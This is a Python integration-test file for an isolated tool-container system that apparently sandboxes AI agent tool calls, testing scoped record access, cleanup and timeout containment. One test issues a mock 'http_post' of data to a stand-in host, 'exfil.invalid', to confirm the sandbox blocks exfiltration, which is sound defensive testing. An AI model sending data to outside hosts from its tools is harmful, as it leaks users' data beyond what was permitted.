"""Actual local Linux tool container; never an arbitrary command or paid provider."""

import os
import time
from uuid import uuid4

import pytest
from support_isolated_tools import record_model_reply, scoped_broker
from support_native_agent import native_executor
from unit.test_isolated_records import records

from cutback.tool_isolation import IsolatedToolSession, discover_local_endpoint, local_endpoint

pytestmark = pytest.mark.skipif(
    os.getenv("CUTBACK_TEST_TOOL_ISOLATION") != "true",
    reason="explicit owned Docker tool-isolation gate",
)


@pytest.fixture
def api_database_url(isolated_postgres_url):
    return isolated_postgres_url


def test_actual_hardened_container_runs_scoped_sql_with_no_ambient_keys_and_confirmed_cleanup(
    monkeypatch,
):
    image = os.environ["CUTBACK_TEST_TOOL_IMAGE_ID"]
    temporary, policy, own, outsider, other_owner = records()
    temporary.close()
    policy = policy.model_copy(update={"image_id": image})
    monkeypatch.setenv("CUTBACK_EXPERIMENT_OPENAI_KEY", "synthetic-host-only-must-not-reach-tools")
    monkeypatch.setenv("CUTBACK_ADMIN_TOKEN", "synthetic-control-only-must-not-reach-tools")
    endpoint = discover_local_endpoint()
    assert local_endpoint(endpoint) == endpoint
    runtime = IsolatedToolSession(policy, [own, outsider, other_owner], endpoint=endpoint)
    try:
        response = runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
        assert response["status"] == "returned", response
        assert own.fields["private_note"] not in str(response)
        for forbidden in (outsider, other_owner):
            denied = runtime.execute(uuid4(), "records_read", {"resource_id": str(forbidden.id)})
            assert denied["status"] == "denied" and denied["response"] is None
        blocked = runtime.execute(
            uuid4(), "http_post", {"url": "https://exfil.invalid", "data": "synthetic"}
        )
        assert blocked["code"] == "ISOLATED_TOOL_NOT_APPROVED"
        operation = uuid4()
        args = {
            "resource_id": str(own.id),
            "expected_version": 0,
            "updates": {"status": "resolved"},
        }
        result = runtime.execute(operation, "records_patch", args)
        assert result["status"] == "returned" and result["state_changed"]
        assert runtime.execute(operation, "records_patch", args)["replayed"]
        snapshot = runtime.owner_snapshot()
        assert snapshot[str(own.id)]["version"] == 1
        assert snapshot[str(own.id)]["fields"]["status"] == "resolved"
        assert (
            snapshot[str(outsider.id)]["version"] == snapshot[str(other_owner.id)]["version"] == 0
        )
        metadata = runtime.metadata()
        assert own.fields["private_note"] not in str(metadata)
        assert metadata["tool_cost_usd"] is metadata["complete_task_cost_usd"] is None
    finally:
        runtime.close()
    assert runtime.containment_receipt()["cleanup_confirmed"] is True
    assert "grants" not in runtime._policy.model_dump()
    assert not runtime._reader_thread.is_alive()
    assert runtime._queue.get_nowait() is None and runtime._queue.empty()


def test_restarted_broker_contains_only_exact_owned_orphan_and_cannot_restart_same_identity():
    from cutback.tool_client import ToolBrokerUncertain

    temporary, policy, own, outsider, other_owner = records()
    temporary.close()
    policy = policy.model_copy(update={"image_id": os.environ["CUTBACK_TEST_TOOL_IMAGE_ID"]})
    endpoint, broker = discover_local_endpoint(), uuid4()
    original = IsolatedToolSession(
        policy, [own, outsider, other_owner], endpoint=endpoint, broker_id=broker
    )
    other_policy = policy.model_copy(update={"session_id": uuid4(), "principal_id": uuid4()})
    untouched = IsolatedToolSession(other_policy, [own], endpoint=endpoint, broker_id=broker)
    try:
        with scoped_broker(
            policy.project_id, policy.principal_id, broker, policy.image_id, endpoint=endpoint
        ) as (client, _):
            assert client.contain(policy)["cleanup_confirmed"]
            assert client.contain(policy)["cleanup_confirmed"]
            with pytest.raises(ToolBrokerUncertain):
                client.start(policy, [own, outsider, other_owner], "a" * 64, client.identity())
            assert untouched.metadata()["tool_cost_usd"] is None
    finally:
        original.close(reconcile=True)
        untouched.close()
    assert original.containment_receipt()["cleanup_confirmed"]
    assert untouched.containment_receipt()["cleanup_confirmed"]


def test_actual_process_loss_and_wall_expiry_never_reapply_or_hide_containment():
    temporary, policy, own, *_ = records()
    temporary.close()
    policy = policy.model_copy(
        update={"image_id": os.environ["CUTBACK_TEST_TOOL_IMAGE_ID"], "max_wall_seconds": 3}
    )
    runtime = IsolatedToolSession(policy, [own], endpoint=discover_local_endpoint())
    time.sleep(3.2)
    try:
        with pytest.raises((ValueError, OSError, ConnectionError, TimeoutError)):
            runtime.execute(uuid4(), "records_read", {"resource_id": str(own.id)})
    finally:
        runtime.close(reconcile=True)
    assert runtime.containment_receipt()["cleanup_confirmed"]


@pytest.mark.postgres
def test_actual_native_http_postgres_episode_uses_isolated_sql_not_fixture_responses(
    api, tenant, tmp_path, monkeypatch
):
    import httpx
    from integration.test_isolated_episodes import approved_record_run
    from sqlalchemy import select

    from cutback.server.tool_db import ToolOperationRecord, ToolSessionRecord
    from cutback.server.worker import run_one

    base, store, run_id, project, principal, broker, image = approved_record_run(
        api,
        tenant,
        tmp_path,
        monkeypatch,
        image=os.environ["CUTBACK_TEST_TOOL_IMAGE_ID"],
    )
    calls = []

    def handle(request):
        calls.append(request)
        return httpx.Response(200, json=record_model_reply(request))

    executor = native_executor("responses.create", monkeypatch, handle)
    try:
        with scoped_broker(
            project, principal, broker, image, endpoint=discover_local_endpoint()
        ) as (client, _):
            result = run_one(
                api[2].state.sessions,
                store,
                executor=executor,
                execution_enabled=True,
                only_run_id=run_id,
                tool_client=client,
            )
        assert result["status"] == "COMPLETED" and len(calls) == 6, result
        with api[2].state.sessions() as session:
            receipts = session.scalars(
                select(ToolSessionRecord).where(ToolSessionRecord.run_id == run_id)
            ).all()
            effects = session.scalars(
                select(ToolOperationRecord).where(ToolOperationRecord.run_id == run_id)
            ).all()
            assert len(receipts) == 2 and all(row.cleanup_confirmed for row in receipts)
            assert len(effects) == 4 and sum(row.state_changed for row in effects) == 2
        assert (
            api[0]
            .get(base + "/experiments/" + str(run_id) + "/tool-sessions", headers=tenant[2])
            .json()["retained_sessions"]
            == 2
        )
    finally:
        executor.close()
